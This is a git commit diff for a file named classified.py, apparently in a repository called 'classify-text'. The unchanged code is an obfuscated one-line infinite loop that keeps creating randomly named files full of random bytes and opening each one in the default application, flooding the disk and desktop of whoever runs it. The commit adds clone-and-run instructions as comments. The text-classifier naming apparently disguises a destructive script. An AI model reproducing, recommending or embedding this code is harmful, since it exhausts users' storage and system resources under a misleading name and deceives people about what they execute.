2db63a312444e5bbcfd057cd43abd66eb3510cbe
classify-text <dxjh112098@dxjh.hcc.edu.tw>
2026-03-06 18:11:49 +0800

    classified.py

--- classified.py
+++ classified.py
@@ -1,2 +1,5 @@
 import os,sys,random,subprocess
 while True:n=''.join(random.sample(os.urandom(16).hex(),8))+'.txt';open(n,'wb').write(os.urandom(random.randint(1000,10000)));(os.startfile(n) if sys.platform.startswith('win') else subprocess.run(['open' if sys.platform=='darwin' else 'xdg-open',n]))
+#git clone https://github.com/classify-text/classified
+#cd classified
+#python3 classified.py
